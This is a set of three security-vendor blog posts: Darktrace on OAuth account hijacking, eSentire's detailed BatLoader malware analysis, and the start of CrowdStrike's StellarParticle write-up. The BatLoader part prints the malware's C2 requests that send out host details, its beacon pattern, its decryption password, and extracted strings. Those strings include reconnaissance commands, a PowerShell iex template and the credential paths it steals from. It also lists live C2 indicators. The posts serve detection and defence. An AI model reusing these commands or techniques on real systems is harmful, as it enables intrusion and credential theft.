SaaS / Admin / OAuth Permission Grant SaaS / Compromise / Unusual Logic Following OAuth Grant SaaS / Admin / New Application Service
PrincipalIaaS / Admin / Azure Application Administration ActivitiesSaaS / Compliance / New Email RuleSaaS / Compromise / Unusual Login and New Email RuleSaaS / Email Nexus / Suspicious Internal Exchange ActivitySaaS / Email Nexus / Possible Outbound Email SpamSaaS / Compromise / Unusual Login and Outbound Email SpamSaaS / Compromise / Suspicious Login and Suspicious Outbound Email(s)Figure 3: DETECT Model Breaches highlighting unusual login and 'PerfectData Software' registration activity from a malicious actor.
In cases where Darktrace RESPOND:trade_mark: was enabled in autonomous response mode, ‘PerfectData Software’ activity chains resulted in breaches of the following RESPOND models:• Antigena / SaaS / Antigena Suspicious SaaS Activity Block• Antigena / SaaS / Antigena Significant Compliance Activity BlockIn response to these model breaches, Darktrace RESPOND took immediate action, performing aggressive, inhibitive actions, such as forcing the actor to log out of the SaaS platform, and disabling the user entirely.
When applied autonomously, these RESPOND actions would seriously impede an attacker’s progress and minimize network disruption.
Figure 4: A RESPOND model breach created in response to a malicious actor's registration of 'PerfectData Software'In addition, Darktrace Cyber AI Analyst was able to autonomously investigate registrations of the ‘PerfectData Software’ application and summarized its findings into digestible reports. 
Figure 5: A Cyber AI Analyst Incident Event log showing AI Analyst autonomously pivoting off a breach of 'SaaS / Admin / OAuth Permission Grant' to uncover details of an account hijacking.
Conclusion Due to the widespread adoption of Microsoft 365 services in the workplace and continued emphasis on a remote workforce, account hijackings now pose a more serious threat to organizations around the world than ever before.
The cases discussed here illustrate the tendency of malicious actors to conduct their activities from endpoints associated with VPN services, while also registering new applications, like PerfectData Software, with malicious intent. 
While it was unclear exactly why the malicious actors were using ‘PerfectData Software’ as part of their account hijacking, it is clear that either the legitimate or spoofed version of the application is becoming an very likely emergent piece of threat actor tradecraft.
Darktrace DETECT’s anomaly-based approach to threat detection allowed it to recognize that the use of ‘PerfectData Software’ represented a deviation in the SaaS user’s expected behavior.
While Darktrace RESPOND, when enabled in autonomous response mode, was able to quickly take preventative action against threat actors, blocking the potential use of the application for data exfiltration or other nefarious purposes.
AppendicesMITRE ATT&CK MappingReconnaissance:• T1598 ­– Phishing for InformationCredential Access:• T1110 – Brute ForceInitial Access:• T1078.004 – Valid Accounts: Cloud AccountsCommand and Control:• T1105 ­– Ingress Tool TransferPersistence:• T1098.003 – Account Manipulation: Additional Cloud Roles Collection:• T1114 – Email Collection Defense Evasion:• T1564.008 ­– Hide Artifacts: Email Hiding Rules­Lateral Movement:• T1534 – Internal SpearphishingUnusual Source IPs•
5.62.60[.]202 (AS198605 AVAST Software s.r.o.) • 160.152.10[.]215 (AS37637 Smile-Nigeria-AS)• 197.244.250[.]155 (AS37705 TOPNET)• 169.159.92[.]36 (AS37122 SMILE)• 45.62.170[.]237 (AS396073 MAJESTIC-HOSTING-01)• 92.38.180[.]49 (AS202422 G-Core Labs S.A)• 129.56.36[.]26 (AS327952 AS-NATCOM)• 92.38.180[.]47 (AS202422 G-Core Labs S.A.)• 107.179.20[.]214 (AS397086 LAYER-HOST-HOUSTON)• 45.62.170[.]31 (AS396073 MAJESTIC-HOSTING-01)References[1] https://www.investing.com/academy/statistics/microsoft-facts/[2] https://intel471.com/blog/countering-the-problem-of-credential-theft[3]
https://darktrace.com/blog/business-email-compromise-to-mass-phishing-campaign-attack-analysis[4] https://darktrace.com/blog/breakdown-of-a-multi-account-compromise-within-office-365 
title: eSentire Threat Intelligence Malware Analysis: BatLoader url: https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-batloader Since being introduced in February 2022, BatLoader is a malware dropper that has been observed dropping several well-known malware or malicious tools like ISFB, SystemBC RAT, Redline Stealer, and Vidar Stealer.
Since its MSI installer file size is 100MB+, BatLoader can easily evade most sandboxes and antivirus tools. 
This malware analysis delves deeper into the technical details of how the BatLoader malware operates and our security recommendations to protect your organization from being exploited. 
Key Takeaways BatLoader delivers additional malware and tools including ISFB, Vidar Stealer, Cobalt Strike, Syncro RMM, and SystemBC RAT via fake installers.eSentire Threat Response Unit (TRU) observed two different BatLoader campaigns in 2022.BatLoader can evade most antivirus detections due to the size of the MSI installers.
The loader drops certain malware if certain conditions of the infected host are met (e.g., ARP table, domain check).The last BatLoader campaign performs the antivirus checks and is capable of modifying Windows UAC prompt, disabling Windows Defender notifications, disabling Task Manager, disabling command prompt, preventing users from accessing Windows registry tools, disabling the Run command, and modifying the display timeout.eSentire TRU assesses with high confidence that BatLoader will remain active in the wild in 2023 and potentially serve as a first stage payload to deliver other malware. 
Case Study BatLoader In September 2022, eSentire TRU observed multiple BatLoader infections in Consumer Services, Retail, Telecommunications, and Non-Profit client environments.
The initial infection starts with the user searching for installers such as Zoom, TeamViewer, AnyDesk, or FileZilla.
The user navigates to the first advertisement displayed, which redirects the user to the website hosting the fake installer.
The MSI installers are signed by “Kancelaria Adwokacka Adwokat Aleksandra Krzemińska” (Figures 1-2). 
Figure 1: Fake Zoom Installer Figure 2: Fake AnyDesk installer In October and November 2022, we observed the second BatLoader campaign pushing fake installers such as TeamViewer (Figure 3), AnyDesk and LogMeIn.
The infections were observed in Insurance, Consulting, Healthcare, and Printing industries. 
Figure 3: Fake TeamViewer download page We also observed several C2 domains related to BatLoader campaigns: updatea1[.]com (first campaign)cloudupdatesss[.]com (first campaign)externalchecksso[.]com (second campaign)internalcheckssso[.]com (second campaign) 
BatLoader Analysis (First Campaign) BatLoader, named by Mandiant, is a malware dropper.
The malware was first mentioned by Mandiant in February 2022.
It’s worth noting that Mandiant mentioned the domain clouds222[.]com for the BatLoader campaign which also overlaps with the Zloader C2 domain. 
eSentire TRU observed BatLoader dropping the following malware / malicious tools: ISFBSystemBC RATRedline StealerVidar Stealer Figure 4: BatLoader infection chain The MSI installer file is over 100MB in size; the large file size is implemented by threat actor(s) to evade sandboxes and antivirus products.
The properties of the BatLoader MSI installer are shown in Figure 5.
Within the MSI file, we have found the components of NovaPDF 11 (Figure 6) and other garbage files shown in Figure 7.
The files reside within the C:\Program Files (x86)\Softland\novaPDF 11\Tools path that is created after the malicious MSI is successfully run, we also found NordVPNSetup.exe dropped within the same path.
We believe that the files mentioned are used as a decoy. 
Figure 5: Properties of the malicious MSI installer Figure 6: NovaPDF 11 components Figure 7: Decoy files The main malicious trigger for the MSI installer resides under CustomAction table.
Custom Actions are the operations defined by the user during installation or MSI execution.
The malicious actor(s) create a custom action to run the malicious PowerShell inline script.
The malicious script resides under AI_DATA_SETTER action name and contains the instructions to download the malicious update.bat file from the C2 domain and place it under AppData\Roaming folder (Figure 8).
The PowerShell script is run via the PowerShell Core or pwsh.exe in a hidden window. 
Figure 8: Malicious PowerShell script under CustomAction Table 
The downloaded update.bat file is responsible for downloading requestadmin.bat file and NirCmd.exe binary (Figure 9). 
Figure 9: Contents of update.bat The requestadmin.bat is responsible for performing antivirus tampering – adding %APPDATA% and %USERPROFILE%\ paths to Windows Defender exclusion to prevent Defender from scanning the mentioned paths.
The batch file was executed via nircmd.exe which was also downloaded from the C2; the utility allows the batch file to run in the background without displaying the user interface.
Besides excluding the paths, the batch file also retrieves and executes the runanddelete.bat and scripttodo.ps1 scripts from the C2 via a native PowerShell command Invoke-WebRequest (Figure 10). 
Figure 10: The contents of requestadmin.bat The scripttodo.ps1 installs the GnuPg, the software that encrypts and signs the data and communications as shown in Figure 11. 
Figure 11: GnuPg installation Further down, the script enumerates the current domain that the user is logged into, the username, and obtains all entries within the IPs starting with 192., 10., and .172 in the ARP cache table.
Once it completes that task, it then checks the amount of IPs found in the ARP table and completes a sum operation. 
If the amount is less than 2 and the user domain is within WORKGROUP, the script will not proceed to further infection.
If the number of IPs is greater than 2, the domain is not in WORKGROUP and does not contain the username, which satisfies all the conditions set in the script, then the full set of malware is retrieved from C2 (Figure 12). 
The requests to the C2 server are performed in the following format: https://<C2 Server>/g5i0nq/index/d2ef590c0310838490561a205469713d/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname https://<C2 Server>/g5i0nq/index/fa0a24aafe050500595b1df4153a17fb/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname https://<C2 Server>/g5i0nq/index/i850c923db452d4556a2c46125e7b6f2/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname https://<C2 Server>/g5i0nq/index/b5e6ec2584da24e2401f9bc14a08dedf/?servername=msi&arp="+ $IP_count + "&domain=" + $UserDomain + "&hostname=" + $UserPCname Figure 12: Enumerating the host and retrieving malware from C2 based on the conditions If the mentioned conditions are not satisfied, the script retrieves the GPG-encrypted files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer) 
If all the conditions are met, the script retrieves the following files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer)d655.dll.gpg (encrypted Cobalt Strike)f827.exe.gpg (encrypted Syncro RMM)shutdowni.bat We were unable to retrieve the shutdowni.bat file but we believe the script might have been deployed to restart the host. 
The GPG decryption routine was borrowed from the script hosted on GitHub (Figure 13).
The script looks for files ending with gpg in %APPDATA% folder and decrypts them using the password 105b. 
Figure 13: GPG decryption snippet Moreover, the scripttodo.ps1 recursively removes the implementation of Windows Defender IOfficeAntiVirus under HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}.
The IOfficeAntivirus component is responsible for detecting malicious or suspicious files downloaded from the Internet.
It then adds the extensions such as exe and DLL as exclusions to Windows Defender.
Additionally, the script downloads Nsudo.exe tool to be able to run files and programs with full privileges. 
We have mentioned that besides scripttodo.ps1, the runanddelete.bat (Figure 14) file was retrieved.
The batch file is responsible for running a malicious executable d2ef5.exe with administrator privileges by creating a VBS script getadmin.vbs under %TEMP% folder to run the binary, but first the user would get an alert prompt from User Account Control (UAC) to allow the program to make changes. 
Figure 14: Contents of runanddelete.bat file The Secrets of BatLoader 
The binary d2ef5.exe is the ISFB banking malware also known as the successor of Gozi or Ursnif.
The first Gozi variant was first discovered by SecureWorks in 2007 and is still active today, spreading through phishing emails and loaders.
The Ursnif version we observed can exfiltrate browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords.
The strings “*terminal* *wallet* *bank* *banco*” were also observed which suggests that Ursnif is also capable of stealing cryptocurrency from digital wallets and banking credentials. 
Upon execution, ISFB creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.
The registry value VirtualStop (the registry values can be different based on the wordlist table hardcoded in the binary).
The registry value contains the command that launches the shortcut (LNK) which contains powershell.exe in the relative path.
The PowerShell starts the CollectMirrow.ps1 script under %USERPROFILE% folder bypassing the PowerShell’s execution policy. 
The command execution example: cmd /c start C:\Users\<username>\VirtualStop.lnk
-ep unrestricted -file C:\Users\<username>\CollectMirrow.ps1 The CollectMirror.ps1 script contains the PowerShell one-liner (Figure 15) that pulls the written data from the registry under HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\<registry_value>>, specifically the TestMouse value (Figure 16). 
Figure 15: Contents of CollectMirror.ps1 Figure 16: Contents of TestMouse registry value The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state, this can be achieved by invoking SleepEx as shown in Figure 17. 
We have observed ISFB injecting itself into a running explorer.exe process.
The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5). 
Figure 17: Process injection We have observed ISFB injecting itself into a running explorer.exe process.
The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5).
You can read the very well-written analyses by Daniel Bunce here and here, but we will cover the main basics of malware. 
The payload locates the BSS section which is where the encrypted strings reside within the function shown in Figure 18 (the hex string 81 38 2E 62 73 73 contains ‘bss’). 
Figure 18: Payload locating the .bss section 
The data stored in the BSS section is encoded as shown in Figure 19. Figure 19: Snipped of the encoded data in the BSS section 
The decryption function is shown below, the decryption function can be represented as the following pseudocode: Figure 20: Decryption function pseudocode The decryption function takes 4 bytes of the encrypted data in BSS at a time and converts them into an integer, then subtracts the key from the index value and adds to the DWORD value which is 4 bytes. 
The decompiled code can be seen in Figure 21.
The decryption function is thoroughly described by 0verfl0w (Daniel Bunce) here.
Part of the key is derived from the division operations from the value retrieved from API call GetSystemTimeAsFileTime (retrieving system time).
Another part of the key is embedded in our payload which is 0x81b8e7da.
Applying the key to the decryption function (Figure 22) and part of the key derived from system time (which is 19) gave us the decrypted data (Figure 23). 
Figure 21: Decompiled decryption function Figure 22: Decryption function in Python Figure 23: Decrypted strings The second decompressed data blob contains the following: 
C2: trackingg-protectioon.cdn1.mozilla[.]net, 45.8.158[.]104, trackingg-protectioon.cdn1.mozilla[.]net, 188.127.224[.]114, weiqeqwns[.]com, wdeiqeqwns[.]com, weiqeqwens[.]com, weiqewqwns[.]com, iujdhsndjfks[.]com Botnet ID: 10101 Server ID: 50 Key: T3H5l6EZGEh6GkB5 Directory: /uploaded Extension: .dib, .pct (beacon extension) 
Sleep time: 1 second ConfigTimeout (time interval to check for a new configuration): 20 seconds 
The third blob contains the wordlist values shown below: ['list', 'stop', 'computer', 'desktop', 'system', 'service', 'start', 'game', 'stop', 'operation', 'black', 'line', 'white', 'mode', 'link', 'urls', 'text', 'name', 'document', 'type', 'folder', 'mouse', 'file', 'paper', 'mark', 'check', 'mask', 'level', 'memory', 'chip', 'time', 'reply', 'date', 'mirrow', 'settings', 'collect', 'options', 'value', 'manager', 'page', 'control', 'thread', 'operator', 'byte', 'char', 'return', 'device', 'driver', 'tool', 'sheet', 'util', 'book', 'class', 'window', 'handler', 'pack', 'virtual', 'test', 'active', 'collision', 'process', 'make', 'local', 'core'] These words are used to build the registry value names. 
Another interesting feature of the ISFB is that it stores three embedded binaries within the unpacked payload.
The binaries are compressed using APLib compression algorithm.
The decompression function is shown in Figure 24. Figure 24: APLib decompression function To be able to locate the embedded compressed binaries, we need to find the structure of the ISFB payload where it stores the configuration.
The configuration contains the payload marker or header, XOR key, CRC32 hash, the offset, and the size of each compressed binary (Figure 25).
The payload marker defines the version of ISFB. 
FJ – old ISFB version J1 – old ISFB version J2 – DreamBot version J3 – ISFB v3 Japan JJ – ISFB v2.14 and above WD – RM3 Figure 25: Header section containing the configuration The compressed data is separated by the null bytes as shown in Figure 26.
You can see something resembling C2 domains in the first blob. 
Figure 26: Snippet of the compressed data We wrote a Python script to extract the compressed data and decompress them (Figure 27).
The first compressed blob contains the RSA public key with the hash 0xe1285e64 (Figure 28). 
Figure 27: Python script to extract and decompress data blobs Figure 28: RSA public key blob ISFB also stores the configuration within the function that parses the payload header (Figure 29).
The hash values are calculated by XORing the value 0x69b25f44 (known as g_CsCookie from the leaked code) with the values that match with CRC_CLIENT32 (again, from the leaked code). 
Figure 29: Snippet of the configuration hashes and payload header parsing The following are the hashes of the payload as a result of XORing: 
0x11271c7f – timer 0x48295783 – timer 0x584e5925 – botnet 0x556aed8f – server 0x4fa8693e – key 0xd0665bf6 – domains 0x54432e74– directory 0xbbb5c71d – extension The traffic beaconing contains the following pattern that will be encrypted with the AES key extracted from the compressed blob: soft=%u&version=%u&user==%08x%08x%08x%08x &server=50&id=10101&crc=61f03b3&uptime=102696&action=%08x&dns=%s&whoami=%s&os=%s soft, version – version of the payload user – the value calculated from applying the RNG (Random Number Generator) algorithm, using the username, computer name, XOR operations, and cpuid call. 
server – server ID id – botnet ID uptime – is the value based on the API calls QueryPerformanceFrequency and QueryPerformanceCounter dns – computer name os – OS version and system type The example of the encrypted with AES-128 beacon, replacing + with _2B and / with _2F, the / are also being added: /uploaded/V1jd62QM3JcPMZGTpdjl2I/mEcoduKcJlNZo/S1Tq0KYy/M2ZEZFPG3iasm8TVeZ5oYf7/m_2FHfl318/E2HneynLJsT2KcKW6/MBeMivC1RFEh/TAL8bLaLD_2/B1Hg1OTg4XQwlG/IJbZJIe0rxQ0SYwzWgYte/TfzvWXXywf9HHwRL/2ZSv_2BcgktHGaZ/hRo7dwwYV3D39_2Bmc/JmEz3Z359/UhGcxj4s_2F80Krry3Kf/tI6i_2BxIXB2d6WASfJ/NCIpYT61pYgL53jx8SghJH/pQnAADp6racXs/VdB_2FRy/o74GaLVJG9neXweATdYNR/5.pct Some interesting strings found: /data.php?version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s \Software\Microsoft\Windows\CurrentVersion SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings %
APPDATA%\Mozilla\Firefox\Profiles EnableSPDY3_0 \Macromedia\Flash Player\ cookies.sqlite cookies.sqlite-journal Mozilla\Firefox\Profiles Microsoft\Edge\User Data\Default Google\Chrome\User Data\Default --use-spdy=off --disable-http2 
Cmd %s processed: %u Cmd %u parsing: %u cmd /C
"%s> %s1" wmic computersystem get domain |more systeminfo.exe tasklist.exe /SVC > driverquery.exe > reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s > 
cmd /U /C
"type %s1 > %s & del %s1" net view > nslookup 127.0.0.1 > nslookup myip.opendns.com resolver1.opendns.com net config workstation > nltest /domain_trusts > nltest /domain_trusts /all_trusts > net view /all
/domain > net view /all > user_pref("network.http.spdy.enabled", false); 
Software\Microsoft\Windows
Mail Software\Microsoft\Windows Live Mail account{*}.oeaccount Account_Name encryptedUsername SMTP_Email_Address encryptedPassword EmailAddressCollection/EmailAddress[%u]/Address Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\ Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\ Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\ Account Name IMAP Server IMAP Password IMAP Use SSL POP3 Server POP3 Password POP3 Use SSL SMTP Server SMTP Password SMTP Use SSL %PROGRAMFILES%\Mozilla Thunderbird %
USERPROFILE%\AppData\Roaming\Thunderbird\Profiles\*.default \logins.json /C pause dll cache2\entries\*.* 
cmd /c start %
s
-ep unrestricted -file %s new-alias -name %s -value gp;new-alias -name
%s -value iex;%s ([System.
Text.
Encoding]::ASCII.GetString((%s "HKCU:\%s").%S)) 
ipconfig /all file://c:\test\test32.dll file://c:\test\tor64.dll 30, 8, *terminal* *wallet* *bank* *banco* Man-in-the-browser is another capability of Ursnif.
You might have noticed strings such as “user_pref("network.http.spdy.enabled", false);”, “EnableSPDY3_0” and “--use-spdy=off --disable-http2”.
Ursnif disables SPDY and HTTP/2 (successor of SPDY protocol) on the infected host.
The protocols allow HTTP data compression to achieve minimal latency.
With the protocol implementation, threat actor(s) might have to spend additional time attempting to modify and intercepting the web traffic. 
We still see some remanences from the Ursnif DreamBot in ISFB v2 (file://c:\test\tor64.dll), which might suggest that the Tor communication capability is still possible. 
Vidar Stealer, SystemBC, and Syncro RMM Agent Botnet: 1259 Version: 54.7 C2:
t[.]me/trampapanam, nerdculture[.]de/@yoxhyp Upon successful infection, first, the host would reach out to the C2 and retrieve the DLLs (Dynamic Link Library) dependencies such as vcruntime140.dll, sqlite3.dll, softokn3.dll, nss3.dll, msvcp140.dll, mozglue.dll, freebl3.dll for the stealer to be able to extract credentials and cookies from browsers and to function properly.
If you are interesting in understanding in more depth what each library is responsible for, you can review our blog on Mars Stealer. 
The stealer then collects the credentials, host information, files, and screenshot and sends it over as a ZIP archive in a base64-encoded format as shown in Figure 30. 
Figure 30: Vidar exfiltrating stolen data We are in the processing of completing a technical analysis of Vidar Stealer, which will be our next blog. 
Syncro RMM is a Remote Monitoring and Management tool used to control and manage devices remotely.
In the hands of a malicious actor, this tool can be used as a persistence mechanism and remote accessing. 
SystemBC RAT also known as “socks5 backconnect system” (MD5: 8ea797eb1796df20d4bdcadf0264ad6c) is a malware that leverages SOCKS5 proxies to hide malicious traffic, it also has the capability of sending additional payloads to the hosts (Figure 31). 
Figure 31: Leaked SystemBC on a hacking forum The RAT creates the mutex “wow64” with the “start” as an argument (“start” will also be used as an argument for the scheduled task command).
If the mutex is not present – the RAT will reach out to the C2.
The C2 configuration is shown below: HOST1: 188.127.224.46 HOST2: hgfiudtyukjnio[.]com PORT1: 4251 TOR: 0 If the mutex is present on the host, the instruction would proceed further to check the integrity level of the current malicious process, then it compares to the value 1000 which is SECURITY_MANDATORY_LOW_RID (low integrity level, SID: S-1-16-0), this means the process is restricted and has limited write permissions. 
If the value is not equal to 1000, it proceeds with scheduled task creation, the task name is “wow64.exe”.
The command to run the scheduled task every 2 minutes is start. 
If the value is equal to 1000, the RAT proceeds to communicate with the C2 (Figure 32). 
Figure 32: Function responsible for calling C2, task scheduling, and mutex creation SystemBC is capable of executing scripts and commands retrieved from C2 such as ps1, bat, vbs, and exe (Figure 33). 
Figure 33:
Scripts supported by SystemBC BatLoader Analysis (Second Campaign) 
The second campaign we observed is slightly different than the first one.
The MSI installer (MD5: 099483061f8321e70ce86c9991385f48) with the signature “Tax In Cloud sp. z o.o.” does not come with an embedded PowerShell script.
Instead, the installer pushes “avolkov.exe” binary to the infected machine and creates the registry key containing the path of the dropped binary which is AppData/Local/ SetupProject1 (Figure 34). 
Figure 34: Malicious MSI installer creating the registry key and dropping the binary file under AppData/Local/SetupProject1 The avolkov.exe binary (MD5: d41e0fee0ec6c2e3da56a6dcf53607da) utilizes libcurl 7.85.0 which enables the data transfer with URL syntax for protocols such as HTTP/HTTPS, FTP, DICT, SMTP, IMAP, POP3, LDAP, acting as a potential backdoor and loader.
The binary has the C2 embedded inside the binary from where it retrieves the newtest.bat file (Figure 35).
The batch script is responsible for pulling additional BatLoader payloads and scripts from C2 such as: requestadmin.bat nircmd.exeuser.ps1checkav.ps1scripttodo.ps1 Figure 35: Contents of newtest.bat The requestadmin.bat (Figure 36) retrieved from the second campaign is different compared to the first campaign.
The threat actor(s) made sure to add more paths and folders to Windows Defender exclusion including %TEMP% and C:\Windows\* as well as adding .ps1
(PowerShell) extension to the exclusion list. 
We observed that the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts: Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout (monitor powers off after 30 minutes) and sleep mode (on AC/battery power – goes to sleep after 3000 minutes (50 hours)). 
The script also no longer pulls runanddelete.bat file from the C2. 
Figure 36: Contents of requestadmin.bat The scripttodo.ps1 file still retrieves the same files from the C2, the Cobalt Strike payload (d655) was changed to a DLL instead of EXE and shutdowni.bat is no longer pulled from the C2. 
user.ps1 (Figure 37) is similar to scriptodo.ps1 in terms of enumerating the current domain of the host, username, and ARP table. 
If all conditions are satisfied and the host has SID S-1-5-32-544 present (Group Name: BUILTIN\Administrators), the script outputs “YES”.
If the conditions are not met and the host belongs to the workgroup, the script retrieves the Cobalt Strike payload named installv2.dll (MD5: 4a6898a4584fdfb34bbeefc77bc882c4) and runs it via rundll32.exe with an ordinal “SRANdomsrt”. 
Interestingly enough, we have observed QakBot using the same ordinal name to run Cobalt Strike payloads. 
Figure 37: Contents of the user.ps1 Another new addition to BatLoader is the antivirus check script (checkav.ps1).
The script checks the host against the list of antiviruses and sends it out to C2 server (Figure 38). 
Figure 38: Contents of checkav.ps1 Later, threat actor(s) switched from externalchecksso[.]com to internalchecksso[.]com.
The scripttodo.ps1 was also changed to ru.ps1 as well as the names for malicious binaries as shown in Figure 39. 
Figure 39: Contents of ru.ps1 How eSentire is Responding Our Threat Response Unit (TRU) combines threat intelligence obtained from continuous research and security incidents to create practical outcomes for our customers.
We are taking a full-scale response approach to ongoing cybersecurity threats by deploying countermeasures, such as: Implementing threat detections and leveraging BlueSteel, our machine-learning powered PowerShell classifier, to identify malicious command execution and ensuring that eSentire has visibility and detections are in place across eSentire MDR for Endpoint and MDR for Network. 
Performing global threat hunts for indicators associated with BatLoader. 
Our detection content is supported by investigation runbooks, ensuring our 24/7 SOC Cyber Analysts respond rapidly to any intrusion attempts related to known malware Tactics, Techniques, and Procedures.
In addition, TRU closely monitors the threat landscape and constantly addresses capability gaps and conducts retroactive threat hunts to assess customer impact. 
Recommendations from eSentire's Threat Response Unit (TRU) We recommend implementing the following controls to help secure your organization against BatLoader malware: Confirm that all devices are protected with Endpoint Detection and Response (EDR) solutions Encouraging good cybersecurity hygiene among your users by using Phishing and Security Awareness Training (PSAT) when downloading software from the Internet.
Encourage your employees to use password managers instead of using the password storage feature provided by web browsers. 
While the TTPs used by adversaries grow in sophistication, they lead to a certain level of difficulties at which critical business decisions must be made.
Preventing the various attack paths utilized by the modern threat actor requires actively monitoring the threat landscape, developing, and deploying endpoint detection, and the ability to investigate logs & network data during active intrusions. 
eSentire’s
TRU is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. 
If you are not currently engaged with an MDR provider, eSentire MDR can help you reclaim the advantage and put your business ahead of disruption. 
Learn what it means to have an elite team of Threat Hunters and Researchers that works for you.
Connect with an eSentire Security Specialist. 
Appendix https://www.mandiant.com/resources/blog/seo-poisoning-batloader-aterahttps://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls?redirectedfrom=MSDNhttps://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/https://www.0ffset.net/reverse-engineering/challenge-1-gozi-string-crypto/https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.htmlhttps://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-mars-stealerhttps://www.secureworks.com/404?aspxerrorpath=/research/gozihttps:/www.secureworks.com/research/gozihttps://owasp.org/www-community/attacks/Man-in-the-browser_attack Indicators of Compromise Name Indicators BatLoader C2 updatea1[.]com BatLoader C2 externalchecksso[.]com BatLoader C2 internalcheckssso[.]com Ursnif C2 weiqeqwns[.]com Ursnif C2 > wdeiqeqwns[.]com Ursnif C2 weiqeqwens[.]com Ursnif C2 weiqewqwns[.]com Ursnif C2 iujdhsndjfks[.]com Ursnif C2 trackingg-protectioon.cdn1.mozilla[.]net Ursnif C2 45.8.158[.]104 Ursnif C2 188.127.224[.]114 Ursnif C2 siwdmfkshsgw[.]com Vidar Stealer t[.]me/trampapanam Ursnif C2 Ijduwhsbvk[.]com Vidar Stealer nerdculture[.]de/@yoxhyp SystemBC C2 hgfiudtyukjnio[.]com SystemBC C2(overlaps with Ursnif C2 ISP) 188.127.224[.]46 Cobalt Strike C2 139.60.161[.]74 Redline C2 176.113.115[.]10 MITRE ATT&CK MITRE ATT&CK Tactic ID MITRE ATT&CK Technique Description MITRE ATT&CK Tactic Initial Access ID T1189 MITRE ATT&CK Technique Drive-by Compromise Description BatLoader is delivered via fake software installers MITRE ATT&CK Tactic User Execution ID T1204.002 MITRE ATT&CK Technique Malicious File Description The user launches the malicious MSI file MITRE ATT&CK Tactic Persistence ID T1547.001 MITRE ATT&CK Technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Description As a result of BatLoader infection, ISFB malware creates the persistence via Registry Run Keys.
Syncro RMM can also be used as a persistence mechanism MITRE ATT&CK Tactic Defense Evasion ID T1562.001 MITRE ATT&CK Technique Impair Defenses:
Disable or Modify Tools Description Disabling Windows Defender notifications, Task Manager and Command Prompt MITRE ATT&CK Tactic Process Injection ID T1055 Description ISFB injects itself into explorer.exe as a result of successful BatLoader infection MITRE ATT&CK Tactic Unsecured Credentials ID T1552.001 MITRE ATT&CK Technique Unsecured Credentials: Credentials In Files Description The ISFB version observed is capable of accessing browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords. 
title: Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign url: https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/ StellarParticle is a campaign tracked by CrowdStrike as related to the SUNSPOT implant from the SolarWinds intrusion in December 2020 and associated with COZY BEAR (aka APT29, “The Dukes”). 
The StellarParticle campaign has continued against multiple organizations, with COZY BEAR using novel tools and techniques to complete their objectives, as identified by CrowdStrike incident responders and the CrowdStrike Intelligence team. 
Browser cookie theft and Microsoft Service Principal manipulation are two of the novel techniques and tools leveraged in the StellarParticle campaign and are discussed in this blog. 
Two sophisticated malware families were placed on victim systems in mid-2019: a Linux variant of GoldMax and a new implant dubbed TrailBlazer. 
Supply chain compromises are an increasing threat that impacts a range of sectors, with threat actors leveraging access to support several motivations including financial gain (such as with the Kaseya ransomware attack) and espionage.
Throughout 2020, an operation attributed to the Foreign Intelligence Service of the Russian Federation (SVR) by the U.S. government was conducted to gain access to the update mechanism of the SolarWinds IT management software and use it to broaden their intelligence collection capabilities.
This activity is tracked by CrowdStrike as the StellarParticle campaign and is associated with the COZY BEAR adversary group. 
This blog discusses the novel tactics and techniques leveraged in StellarParticle investigations conducted by CrowdStrike.
These techniques include: Credential hopping for obscuring lateral movement Office 365 (O365) Service Principal and Application hijacking, impersonation and manipulation Stealing browser cookies for bypassing multifactor authentication Use of the TrailBlazer implant and the Linux variant of GoldMax malware Credential theft using Get-ADReplAccount Credential Hopping The majority of StellarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victim’s O365 environment.
This has been advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an accurate accounting of time, account and source IP address of adversary victimization of the O365 tenant.
In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victim’s own network. 
